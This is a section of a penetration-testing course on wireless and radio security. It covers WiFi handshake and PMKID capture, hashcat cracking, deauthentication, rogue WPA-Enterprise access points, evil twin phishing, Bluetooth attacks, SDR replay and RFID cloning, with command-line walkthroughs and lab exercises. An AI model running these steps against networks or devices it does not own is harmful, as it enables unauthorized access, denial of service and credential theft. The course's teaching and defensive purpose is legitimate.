---
title: "Wireless and radio: WiFi, BT, SDR"
area: "Wireless"
order: 20
level: "advanced"
summary: "802.11 frames, WEP/WPA/WPA2/WPA3, PMKID, KRACK, evil twin, Bluetooth/BLE basics (BlueBorne, BIAS, KNOB), introduction to SDR (HackRF, RTL-SDR), GSM/4G/5G concepts, RFID/NFC basics."
prereq:
  - "Sections 03, 12"
tools:
  - "aircrack-ng suite, hcxtools, hcxdumptool"
  - "hostapd, hostapd-wpe"
  - "bettercap, WiFi Pumpkin 3"
  - "RTL-SDR / HackRF, GNURadio, GQRX"
  - "Bluetooth: bluez, btlejack, gattacker, Flipper Zero"
---

# Wireless and radio

## 802.11 — the WiFi protocol

Management/control/data frames. Passive reconnaissance:
- **Probe Request**: the device searches for known SSIDs.
- **Probe Response**: the AP replies if the SSID matches (or if "any").
- **Beacon**: the AP advertises SSID, capabilities, security.
- **Authentication / Association**.

### Monitor mode setup
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0       # crea wlan0mon
iw dev wlan0mon set type monitor
iwconfig wlan0mon                # verifica mode Monitor
```

### Discovery
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng --band abg wlan0mon
# Capturando un BSSID specifico
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
```

### WEP (history)
Broken. RC4 + 24-bit IV → collisions. Cracked in 10 minutes with `aircrack-ng`. If you find WEP in 2026, it's criminal negligence.

### WPA/WPA2-Personal (PSK)
PSK passphrase + SSID + nonces → 4-way handshake → PMK/PTK.

**Capturing the handshake:**
```bash
# Provoca disconnessione → riassociazione → handshake
sudo aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
# Salva cap
```

**Crack:**
```bash
hcxpcapngtool -o handshake.hc22000 cap.cap
hashcat -m 22000 handshake.hc22000 rockyou.txt
```

#### PMKID attack (Hashcat #16800/22000)
Even without a connected client, some APs "gift" the PMKID during M1 of the 4-way. `hcxdumptool` captures it:

```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=15
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

**Mitigation:** long passphrases, WPA3, disable PMKID where possible, SSID segregation.

### WPA-Enterprise (802.1X EAP)
Auth based on certificate/credentials through RADIUS. Common in enterprises.

Attacks:
- **Rogue AP** with the same SSID + self-signed cert → device that doesn't validate the cert → sends MSCHAPv2 → offline crack (`asleap` or crack.sh).
- `hostapd-wpe` automates it.

```bash
hostapd-wpe ./hostapd-wpe.conf
# Cattura: MS-CHAPv2 challenge/response → crack
```

**Mitigation:** **strict certificate validation** on clients (server cert pinned, CA validated).

### KRACK (CVE-2017-13077 and related)
Replay a nonce in the 4-way handshake → reinstall key → decrypt. Mathy Vanhoef. Patched everywhere by now.

### WPA3
- **SAE** (Simultaneous Authentication of Equals): handshake with dragonfly, no offline crack of a weak passphrase.
- **Forward secrecy**.
- **Management Frame Protection (PMF)** mandatory.

Attacks:
- **Dragonblood** (2019): side channel on SAE → PSK recovery in some cases.
- **Downgrade** WPA3 → WPA2 in transition mode.

### Deauth attacks
Unprotected management frames (pre-PMF) → spoofed deauth. Effective DoS, forces re-auth. `aireplay-ng -0`. PMF blocks this.

## Evil twin and captive portal phishing

Creates a fake AP with the same SSID, stronger signal. Tools: **WiFi Pumpkin 3**, **airgeddon**, **fluxion** (legacy). Captive portal asking for the password "to reconnect" → log.

For enterprises: monitor unauthorized BSSIDs. WIDS (Wireless IDS) such as Aerohive, Cisco Wireless IDS.

## Bluetooth and BLE

### Bluetooth Classic
- Pairing: legacy (PIN, MITM-able), Secure Simple Pairing (SSP) — 2007+.
- Modes: Just Works, Numeric Comparison, Passkey, OOB.

### BLE (Low Energy, 4.0+)
- GAP / GATT model.
- Pairing methods share the same names but a different protocol. **Just Works** = no MITM protection.
- Security: pre-5.0 ECDH at 128 bits, more robust from 5.x.

### Famous attacks
- **BlueBorne** (2017): wireless RCE without pairing on many stacks.
- **KNOB** (Key Negotiation of Bluetooth, 2019): downgrades BR/EDR key entropy to 1 byte → brute force.
- **BIAS** (Bluetooth Impersonation AttackS, 2020): impersonation.
- **BrakTooth, SweynTooth**: families of stack bugs.
- **BLE replay** on smart locks.

Tools:
- **bluez** (Linux stack).
- **btlejack** (Mike Ryan).
- **gattacker** (Node BLE MITM).
- **Flipper Zero** (multi-protocol hardware — BLE, sub-GHz, NFC, RFID, IR).

### What to look for in a pentest
- Smart locks / IoT with BLE: pairing on a weak PIN, no rotation.
- Trackers (AirTag, Tile): privacy protocols (stalking detection).
- Wearables with health data.

## SDR — Software Defined Radio

A radio is "software"-defined: the tuner captures RF, the computer demodulates. Hardware:

| Hardware | Range | TX? | Price |
|---|---|---|---|
| **RTL-SDR** | 25 MHz – 1.7 GHz | RX only | ~€30 |
| **HackRF One** | 1 MHz – 6 GHz | RX+TX (half) | ~€300 |
| **BladeRF** | varies | RX+TX (full) | €400+ |
| **LimeSDR** | 100 kHz – 3.8 GHz | RX+TX | €250+ |
| **USRP** (Ettus) | enterprise | RX+TX | €800+ |
| **Flipper Zero** | sub-GHz limited | varies | €170 |

Software:
- **GQRX** — simple spectrum/audio receiver.
- **SDR#** — Windows.
- **GNURadio** — flowgraph development.
- **inspectrum** — visual burst analysis.
- **rtl_433** — recognizes 100+ ISM protocols (weather stations, energy meters, gate remotes).
- **URH** (Universal Radio Hacker).

### Common bands
- **433/315/868/915 MHz**: gate remotes, controllers, sensors, LoRa.
- **2.4 GHz / 5 GHz**: WiFi, BT, ZigBee.
- **1 GHz – 2 GHz**: GSM (historically 900 MHz), GPS (1.5).
- **5 GHz +**: high-band WiFi.

### What you can learn to do
- Capture and replay gate remotes / wireless doorbells / smart-home sensors.
- Decode ISM protocols with `rtl_433`.
- Analyze LoRa / Sigfox traffic.
- ADS-B (aircraft in flight) with dump1090.
- AIS (ships).
- POCSAG pagers.
- Synthetic GPS (illegal to transmit → only local reception/simulation).

### Legal limits
**TX on licensed frequencies is illegal.** ISM bands (433.92, 868.3 in the EU) have precise power limits. Experiment with TX inside a closed lab (Faraday cage) or only RX. In Italy: D.Lgs. 259/2003 (Codice delle comunicazioni elettroniche).

## RFID and NFC

- **RFID LF** (125 kHz, EM4100, HID Prox) — old badges, **easily cloned** with Proxmark3 or Flipper.
- **RFID HF** (13.56 MHz, ISO 14443, Mifare Classic) — Mifare Classic has a known key crack (CRYPTO1). More secure: Mifare DESFire EV2/EV3 (AES, secure messaging).
- **NFC** = HF subset + application protocol (smartphone tap, payment).
- **HID iCLASS, Legic, FELICA**: various levels of security.

### Tools
- **Proxmark3** — the RFID "Swiss army knife". ~€250.
- **Flipper Zero** — good for most LF/HF, limited NFC.
- **PN532** breakout board — cheap for learning.

### Attacks
- Cloning LF / unpatched Mifare Classic badges.
- Sniff and replay of contactless NFC cards (although the EMV protocol has replay protection via cryptogram).
- Long-range RFID with powerful antennas (skimming).

## GSM / 3G / 4G / 5G overview

- **GSM** (2G) — A5/1 ciphering crackable (for decades). IMSI catcher (Stingray, Rayzone) intercepts phones by forcing downgrade. **Illegal** for private use in many jurisdictions.
- **3G/4G/5G** — more robust mutual auth. SUPI/SUCI in 5G protects identity.

In real mobile pentests: you usually don't operate at the radio layer (illegal and out of scope). You test the app + back-end.

## Industrial IoT and SCADA (overview)

OT/ICS protocols: Modbus, DNP3, IEC-104, BACnet, EtherCAT, Profinet. Often without auth or encryption. Defense: total segmentation (air-gap or data diode), passive monitoring (Claroty, Nozomi).

## Exercises

### Exercise 20.1 — WiFi recon
With a USB WiFi adapter that supports monitor mode (Alfa AWUS036NHA, AWUS036ACS):
- airmon-ng start.
- airodump-ng → how many networks? how many BSSIDs? which channel is the busiest?
- Probe request analysis: how many "remembered" SSIDs leak from your neighbors?

### Exercise 20.2 — Capture a WPA2 handshake (on your own network)
On your home WiFi (not your neighbor's):
- targeted airodump.
- aireplay-ng -0 (5 deauths).
- Capture .cap with EAPOL frames.
- Convert, crack with hashcat.

If your passphrase is long and random, it will be uncrackable in reasonable time. Bonus.

### Exercise 20.3 — PMKID
```bash
sudo hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=15
# attendi PMKID (non sempre)
hcxpcapngtool -o hash.hc22000 cap.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

Check whether your AP is vulnerable to PMKID (some have disabled it).

### Exercise 20.4 — Evil twin (in an isolated lab)
Set up hostapd-wpe to simulate a rogue WPA-Enterprise. Connect a client (a test phone with an SSID configured to connect without cert validation). Capture MS-CHAPv2. Crack with `asleap` or `hashcat -m 5500`.

**Only on your own network + your own device.**

### Exercise 20.5 — Bluetooth scan
```bash
sudo bluetoothctl
[bluetooth]# scan on
```

How many devices? Which ones have a descriptive name (smartphone-Marco, MacBook-Anna)? OPSEC implications?

### Exercise 20.6 — SDR first step
- USB RTL-SDR (~€25).
- GQRX on Linux/macOS or SDR# on Win.
- Tune to 88-108 MHz: you should see FM stations.
- Tune 162.55 MHz (NOAA weather US) or 433.92 MHz (home devices).

### Exercise 20.7 — rtl_433
```bash
rtl_433 -f 433.92M -F json
```

Listen to weather sensors, remotes, energy meters. How many devices passively emit personal data (ID, value)?

### Exercise 20.8 — Flipper Zero (if you have one)
- Sub-GHz: record a remote, replay.
- NFC: read an unprotected badge, dump UID.
- BadUSB / IR: explore.

### Exercise 20.9 — Read up
- "WiFi Hacking with Aircrack-ng" — official guides.
- Mathy Vanhoef's site (KRACK, FragAttacks).
- DEF CON Wireless Village talks.
- "Hacking Exposed: Wireless" (book).

## Key concepts

1. **Monitor mode** is the prerequisite for any WiFi recon.
2. **WPA2-PSK with a weak passphrase** = cracked in minutes.
3. **WPA-Enterprise** is secure only with strict client-side server cert validation.
4. **WPA3** closes many WPA2 gaps but not all.
5. **Bluetooth** requires stack-specific knowledge.
6. **SDR** opens up the radio world — entry kit at €30.
7. **TX legality**: watch out, it's heavily regulated.

Next: hardware and firmware.
